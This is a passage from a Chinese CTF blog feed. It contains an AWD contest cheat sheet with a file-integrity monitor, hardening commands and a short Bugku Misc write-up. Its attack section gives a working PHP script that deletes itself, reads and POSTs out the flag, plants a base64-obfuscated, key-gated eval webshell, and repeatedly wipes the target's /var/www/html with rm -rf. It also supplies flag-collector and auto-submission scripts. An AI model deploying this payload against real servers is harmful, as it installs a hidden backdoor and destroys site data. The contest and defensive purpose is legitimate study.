class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">-*- coding: utf-<span class="number">8</span> -*-<span class="comment">#</span></span><br><span class="line">awd文件监控脚本</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ListDir</span>(<span class="params">path</span>):</span> <span class="comment"># 获取网站所有文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">file_path = os.path.join(path, file)</span><br><span class="line"><span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line"><span class="keyword">if</span> initialization[<span class="string">&#x27;ok&#x27;</span>] == <span class="string">&#x27;false&#x27;</span>:</span><br><span class="line">dir_list.append(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">dir_list_tmp.append(file_path)</span><br><span class="line">ListDir(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> initialization[<span class="string">&#x27;ok&#x27;</span>] == <span class="string">&#x27;false&#x27;</span>:</span><br><span class="line">file_list.append(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">file_list_tmp.append(file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetHash</span>():</span> <span class="comment"># 获取hash，建立索引</span></span><br><span class="line"><span class="keyword">for</span> bak <span class="keyword">in</span> file_list:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(bak, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">md5obj = hashlib.md5()</span><br><span class="line">md5obj.update(f.read())</span><br><span class="line"><span class="built_in">hash</span> = md5obj.hexdigest()</span><br><span class="line">bak_dict[bak] = <span class="built_in">hash</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&#x27;/tmp/awd_web_hash.txt&#x27;</span>) == <span class="literal">False</span>:</span><br><span class="line">os.system(<span class="string">&#x27;mkdir /tmp/awd_web_bak/&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;\\cp -a &#123;0&#125;* /tmp/awd_web_bak/&#x27;</span>.<span class="built_in">format</span>(web_dir))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/awd_web_hash.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f: <span class="comment"># 记录web文件hash</span></span><br><span class="line">f.write(<span class="built_in">str</span>(json.dumps(bak_dict)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file_list: <span class="comment"># 记录web文件列表</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/awd_web_list.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(i <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dir_list: <span class="comment"># 记录web目录列表</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/awd_web_dir.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(i <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FileMonitor</span>():</span> <span class="comment"># 文件监控</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取当前web目录状态</span></span><br><span class="line"></span><br><span class="line">initialization[<span class="string">&#x27;ok&#x27;</span>] = <span class="string">&#x27;true&#x27;</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(web_dir):</span><br><span class="line">file_path = os.path.join(web_dir, file)</span><br><span class="line"><span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line">dir_list_tmp.append(file_path)</span><br><span class="line">ListDir(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">file_list_tmp.append(file_path)</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> file_list_tmp:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">md5obj = hashlib.md5()</span><br><span class="line">md5obj.update(f.read())</span><br><span class="line"><span class="built_in">hash</span> = md5obj.hexdigest()</span><br><span class="line">bak_dict_tmp[file] = <span class="built_in">hash</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/awd_web_hash.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f: <span class="comment"># 读取备份的文件hash</span></span><br><span class="line">real_bak_dict = json.loads(f.read())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/awd_web_list.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f: <span class="comment"># 读取备份的文件列表</span></span><br><span class="line">real_file_list = f.read().split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/awd_web_dir.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f: <span class="comment"># 读取备份的目录列表</span></span><br><span class="line">real_dir_list = f.read().split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> real_dir_list: <span class="comment"># 恢复web目录</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.makedirs(<span class="built_in">dir</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[del-recover]dir:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">dir</span>))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> file_list_tmp:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> real_bak_dict[file] != bak_dict_tmp[file]: <span class="comment"># 检测被篡改的文件，自动恢复</span></span><br><span class="line">os.system(<span class="string">&#x27;\\cp &#123;0&#125; &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(file.replace(web_dir, <span class="string">&#x27;/tmp/awd_web_bak/&#x27;</span>), file))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[modify-recover]file:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(file))</span><br><span class="line"><span class="keyword">except</span>: <span class="comment"># 检测新增的文件，自动删除</span></span><br><span class="line">os.system(<span class="string">&#x27;rm -rf &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(file))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[delete]webshell:&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(file))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> real_file <span class="keyword">in</span> real_file_list: <span class="comment"># 检测被删除的文件，自动恢复</span></span><br><span class="line"><span class="keyword">if</span> real_file <span class="keyword">not</span> <span class="keyword">in</span> file_list_tmp:</span><br><span class="line">os.system(<span class="string">&#x27;\\cp &#123;0&#125; &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(real_file.replace(web_dir, <span class="string">&#x27;/tmp/awd_web_bak/&#x27;</span>), real_file))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[del-recover]file:&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(real_file))</span><br><span class="line">file_list_tmp[:] = []</span><br><span class="line">dir_list_tmp[:] = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;rm -rf /tmp/awd_web_hash.txt /tmp/awd_web_list.txt /tmp/awd_web_dir.txt /tmp/awd_web_bak/&#x27;</span>)</span><br><span class="line">web_dir = <span class="string">&#x27;/var/www/&#x27;</span> <span class="comment"># web目录，注意最后要加斜杠</span></span><br><span class="line">file_list = []</span><br><span class="line">dir_list = []</span><br><span class="line">bak_dict = &#123;&#125;</span><br><span class="line">file_list_tmp = []</span><br><span class="line">dir_list_tmp = []</span><br><span class="line">bak_dict_tmp = &#123;&#125;</span><br><span class="line">initialization = &#123;<span class="string">&#x27;ok&#x27;</span>: <span class="string">&#x27;false&#x27;</span>&#125;</span><br><span class="line">ListDir(web_dir)</span><br><span class="line">GetHash()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="built_in">print</span>(time.ctime() <span class="string">&#x27; 安全&#x27;</span>)</span><br><span class="line">FileMonitor()</span><br><span class="line">time.sleep(<span class="number">1</span>) <span class="comment"># 监控间隔，按需修改</span></span><br></pre></td></tr></table></figure><h1 id="AWD线下赛攻击脚本："><a href="#AWD线下赛攻击脚本：" class="headerlink" title="AWD线下赛攻击脚本："></a>AWD线下赛攻击脚本：</h1><p>（1）内存马&amp;自动获取刷新的flag</p><p>该脚本功能：</p><p>1.该脚本为内存脚本，访问一下就自删除，不留痕迹。</p><p>2.自动读取flag，并将flag提交到指定地址，会自动检测是否更新flag，只有更新了flag才会提交，需要在脚本中修改flag物理路径。</p><p>3.会生成不死马，不死马具有隐藏和欺骗功能。用蚁剑访问<a href="http://xxx/.c403d59fea33113df44d465aeec336ab.php?key=ssr2021shuoshurenmd5%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BAa%E3%80%82">http://xxx/.c403d59fea33113df44d465aeec336ab.php?key=ssr2021shuoshurenmd5，密码为a。</a></p><p>木马原始代码如下（只要别人不知道key，就没办法黑吃黑）：</p><p><code>&lt;?php $key=$_GET[&#39;key&#39;];$keyhash=md5($key);if($keyhash===&#39;c403d59fea33113df44d465aeec336ab&#39;) &#123;    eval($_POST[&#39;a&#39;]);&#125;echo&#39;file not find.&#39;;?&gt;</code></p><p>这个只作为备用连接，flag正常自己提交过来的话就不用管。</p><p>4.该脚本会不断删除目标的网站源码，别人扣分等于我们加分。</p><p>5.脚本命名必须为awd2021.php，若要修改的话需要同步修改下面代码中的文件名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function send_post($url, $post_data) &#123;</span><br><span class="line">$postdata = http_build_query($post_data);</span><br><span class="line">$options = array(</span><br><span class="line"><span class="string">&#x27;http&#x27;</span> =&gt; array(</span><br><span class="line"><span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;header&#x27;</span> =&gt; <span class="string">&#x27;Content-type:application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;content&#x27;</span> =&gt; $postdata,</span><br><span class="line"><span class="string">&#x27;timeout&#x27;</span> =&gt; <span class="number">15</span> * <span class="number">60</span></span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line">$context = stream_context_create($options);</span><br><span class="line">$result = file_get_contents($url, false, $context);</span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line">$flag_tmp=<span class="string">&#x27;flag&#123;xxx&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">@unlink (<span class="params"><span class="string">&#x27;awd2021.php&#x27;</span></span>);</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>) &#123;</span><br><span class="line">$flag=system(<span class="string">&#x27;cat flag.txt&#x27;</span>);</span><br><span class="line">$data=array(</span><br><span class="line"><span class="string">&#x27;flag&#x27;</span> =&gt; $flag</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> ($flag!=$flag_tmp) &#123;</span><br><span class="line">send_post(<span class="string">&#x27;http://127.0.0.1/getflag.php&#x27;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line">$flag_tmp=$flag;</span><br><span class="line">$shell=base64_decode(<span class="string">&#x27;PD9waHAgJGtleT0kX0dFVFsia2V5Il07CiRrZXloYXNoPW1kNSgka2V5KTsKaWYoJGtleWhhc2g9PT0iYzQwM2Q1OWZlYTMzMTEzZGY0NGQ0NjVhZWVjMzM2YWIiKSB7CglldmFsKCRfUE9TVFsiYSJdKTsKfQplY2hvImZpbGUgbm90IGZpbmQuIjsKPz4=&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">&#x27;.c403d59fea33113df44d465aeec336ab.php&#x27;</span>)==<span class="number">0</span>) &#123;</span><br><span class="line">file_put_contents(<span class="string">&#x27;.c403d59fea33113df44d465aeec336ab.php&#x27;</span>, $shell, FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&#x27;rm -rf /var/www/html/* !(.c403d59fea33113df44d465aeec336ab.php)&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>（2）服务端接收flag</p><p>1.按照往年比赛经验，靶机和我们的电脑是互通的，这个脚本可以本机开一个phpstudy跑起来，若不通的话直接放自己的靶机服务器上。</p><p>2.这个脚本默认名字为getflag.php，如果修改的话需要修改内存脚本中对应的文件名。</p><p>3.新的flag会源源不断提交过来，在当前目录的shuoshuren_flag.txt里面。</p><p><code>&lt;?php$flag=$_POST[&#39;flag&#39;];file_put_contents(&#39;shuoshuren_flag.txt&#39;, $flag.&#39;\n&#39;, FILE_APPEND);?&gt;</code></p><p>（3）自动提交flag脚本</p><p>根据往年经验，flag提交平台是有验证码的，所以这个脚本调用了验证码训练识别模型，达到自动化提交flag的目的，平台没有验证码的话就不用识别。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># base python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetPic</span>(<span class="params">url</span>):</span> <span class="comment"># 获取验证码并识别，这里会调用我本机的验证码训练识别模型（refer：算命瞎子）</span></span><br><span class="line">pic_content=requests.get(url).content</span><br><span class="line">pic_base64=base64.b64encode(pic_content).decode()</span><br><span class="line">data=<span class="string">&#x27;base64=&#x27;</span> pic_base64</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">yzm=requests.post(<span class="string">&#x27;http://192.168.3.103:8899/base64&#x27;</span>,data=data).text</span><br><span class="line"><span class="keyword">return</span> yzm</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;yzm&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PostFlag</span>(<span class="params">PostUrl,PicUrl,flag</span>):</span> <span class="comment"># 提交flag</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(flag,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">flag_list=f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="comment">#请求头需要现场抓包</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> flag_list:</span><br><span class="line"><span class="keyword">if</span> flag <span class="keyword">in</span> flag_list:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; 重复&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">GetYzm=GetPic(PicUrl)</span><br><span class="line">data = json.dumps(&#123;<span class="string">&#x27;请求体需要现场抓包，字典格式&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res=requests.post(url=PostUrl,headers=headers,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;成功的标识符&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; 提交成功&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">flag_list_ok.append(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; 提交失败&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;其他错误&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag_list_ok=[]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:<span class="comment">#</span></span><br><span class="line">PostFlag(<span class="string">&#x27;提交flag的请求地址&#x27;</span>,<span class="string">&#x27;flag平台验证码的地址&#x27;</span>,<span class="string">&#x27;shuoshuren_flag.txt&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">300</span>)<span class="comment">#休息5分钟，可以按需修改</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="备份网站"><a href="#备份网站" class="headerlink" title="备份网站"></a>备份网站</h1><p>scp -r <a href="mailto:&#x72;&#111;&#x6f;&#116;&#x40;&#x31;&#x32;&#55;&#46;&#x30;&#x2e;&#x30;&#x2e;&#49;">&#x72;&#111;&#x6f;&#116;&#x40;&#x31;&#x32;&#55;&#46;&#x30;&#x2e;&#x30;&#x2e;&#49;</a>:/www/html ./   下载远程的/www/html到当前的目录</p><p>scp -r testfile <a href="mailto:&#114;&#x6f;&#111;&#x74;&#64;&#x31;&#x32;&#55;&#x2e;&#48;&#46;&#x30;&#x2e;&#x31;">&#114;&#x6f;&#111;&#x74;&#64;&#x31;&#x32;&#55;&#x2e;&#48;&#46;&#x30;&#x2e;&#x31;</a>:/www/html    把当前目录的testfile上传到远程的/www/html</p><h1 id="查看已建立的网络连接以及对应进程"><a href="#查看已建立的网络连接以及对应进程" class="headerlink" title="查看已建立的网络连接以及对应进程"></a>查看已建立的网络连接以及对应进程</h1><p>​    netstat -antulp | grep EST</p><h1 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h1><p>​    whoami　　//查看当前用户<br>​    pkill -kill -t &lt;用户tty&gt;　　 //踢掉当前登录用户</p><h1 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h1><p>​    查看进程信息<br>​    ps aux | grep pid或者进程名　　<br>​    </p><pre><code>查看指定端口被哪个进程占用lsof -i:端口号 或者 netstat -tunlp|grep 端口号结束进程命令kill PIDkillall &lt;进程名&gt;kill -9 &lt;PID&gt;</code></pre><h1 id="iptables命令"><a href="#iptables命令" class="headerlink" title="iptables命令"></a>iptables命令</h1><p>​    封杀某个IP或者ip段，如：123.4.5.6<br>​    iptables -I INPUT -s 123.4.5.6 -j DROP<br>​    iptables -I INPUT -s 123.4.5.1/24 -j DROP<br>​    </p><pre><code>禁止从某个主机ssh远程访问登陆到本机，如123.4.5.6iptable -t filter -A INPUT -s 123.4.5.6 -p tcp --dport 22 -j DROP</code></pre><h1 id="Mysql数据库操作"><a href="#Mysql数据库操作" class="headerlink" title="Mysql数据库操作"></a>Mysql数据库操作</h1><pre><code>备份mysql数据库mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql　　//备份指定数据库mysqldump --all-databases &gt; bak.sql　　　　//备份所有数据库还原mysql数据库mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql</code></pre><h1 id="安全检查"><a href="#安全检查" class="headerlink" title="安全检查"></a>安全检查</h1><pre><code>find / *.php -perm 4777 　　 //查找777的权限的php文件 awk -F: &#39;&#123;if($3==0)print $1&#125;&#39; /etc/passwd　　//查看root权限的账号crontab -l　　//查看计划任务检测所有的tcp连接数量及状态netstat -ant|awk &#39;&#123;print $5 &quot;\t&quot; $6&#125;&#39; |grep &quot;[1-9][0-9]*\.&quot;|sed -e &#39;s/::ffff://&#39; -e &#39;s/:[0-9]*//&#39;|sort|uniq -c|sort -rn　　查看页面访问排名前十的IPcat /var/log/apache2/access.log  | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10　　查看页面访问排名前十的URLcat /var/log/apache2/access.log  | cut -f4 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10　　</code></pre><p>　</p><h1 id="改密码"><a href="#改密码" class="headerlink" title="改密码"></a>改密码</h1><p>passwd</p><h1 id="后门用户"><a href="#后门用户" class="headerlink" title="后门用户"></a>后门用户</h1><p>cat /etc/passwd | grep bash<br>userdel hack<br>userdel backdoor</p><h1 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h1><p>scp -r <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#64;&#49;&#x32;&#55;&#46;&#x30;&#46;&#48;&#49;">&#114;&#x6f;&#x6f;&#x74;&#64;&#49;&#x32;&#55;&#46;&#x30;&#46;&#48;&#49;</a>:/var/www/html ./<br>scp testfile <a href="mailto:&#114;&#111;&#111;&#116;&#x40;&#49;&#x32;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49;">&#114;&#111;&#111;&#116;&#x40;&#49;&#x32;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49;</a>:/var/www/html</p><p>mysql -u root -h localhost -p<br>mysqldump TBNAME &gt; ~/tbname.sql</p><h1 id="改php数据库密码"><a href="#改php数据库密码" class="headerlink" title="改php数据库密码"></a>改php数据库密码</h1><p>方法一：update mysql.users set password=password(“123..com “) where user = ‘check’;<br>              flush privileges;</p><p>方法二：set password for root@localhost = password(‘123..com’);</p><p>SELECT user,host FROM mysql.user;<br>use mysql;<br>update user set host=’localhost’ where user=’root’;<br>flush privileges; </p><h1 id="通防"><a href="#通防" class="headerlink" title="通防"></a>通防</h1><p>//通过winscp，等方式，将cwphp.php通防脚本放到/var/www/html<br>cd /var/www/html<br>find -name ‘*.php’ -exec sed -i “1i <?php @include_once('/var/www/html/cwphp.php');?>“ {} ;</p><h1 id="查端口-禁用"><a href="#查端口-禁用" class="headerlink" title="查端口,禁用"></a>查端口,禁用</h1><p>netstat -antulp<br>iptables -I INPUT -p tcp –dprot 22 -j DROP    </p><h1 id="找简单漏洞"><a href="#找简单漏洞" class="headerlink" title="找简单漏洞"></a>找简单漏洞</h1><p>grep -rl eval /var/www/html<br>eval base64 system file_get_contents readfile fopen<br>find . -name ‘<em>.php’ | xargs grep -n ‘eval(‘<br>find . -name ‘</em>.php’ | xargs grep -n ‘assert(‘<br>find . -name ‘*.php’ | xargs grep -n ‘system(‘</p><h1 id="查端口禁用"><a href="#查端口禁用" class="headerlink" title="查端口禁用"></a>查端口禁用</h1><p>netstat -antulp<br>iptables -I INPUT -p tcp –dprot 22 -j DROP    </p><p>再推荐一篇安全应急排查手册：<a href="https://yq.aliyun.com/articles/177337">https://yq.aliyun.com/articles/177337</a> </p><p>部分来自<a href="http://www.360doc.com/content/21/0621/14/71939662_983023628.shtml">http://www.360doc.com/content/21/0621/14/71939662_983023628.shtml</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuMisc</title>
      <link href="/bufferfly/blog/287057934.html"/>
      <url>/bufferfly/blog/287057934.html</url>
      
        <content type="html"><![CDATA[<h1 id="where-is-flag"><a href="#where-is-flag" class="headerlink" title="where_is_flag"></a>where_is_flag</h1><p>下载附件得到10个txt文件，用010打开发现里面全是00截断符号<br><img src="/img/MISC/whereisflag1.jpg" alt="avatar"></p><p>看字节大小，用py脚本把每个文件的字节长度跑出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    name = <span class="built_in">str</span>(n)+<span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(f.read()),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/MISC/whereisflag2.jpg" alt="avatar"><br>跑出来的字节长度应该是十进制的ascii码，尝试对它进行分割，然后跑出来得到 bugku{na0d0ngdaka1}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    name = <span class="built_in">str</span>(n)+<span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(f.read()),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;98 117 103 107 117 123 110 97 48 100 48 110 103 100 97 107 97 49 125&#x27;</span></span><br><span class="line">flag=flag.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i)),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/MISC/whereisflag3.jpg" alt="avatar"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>moeCTF_2021</title>
      <link href="/bufferfly/blog/401787381.html"/>
      <url>/bufferfly/blog/401787381.html</url>
      
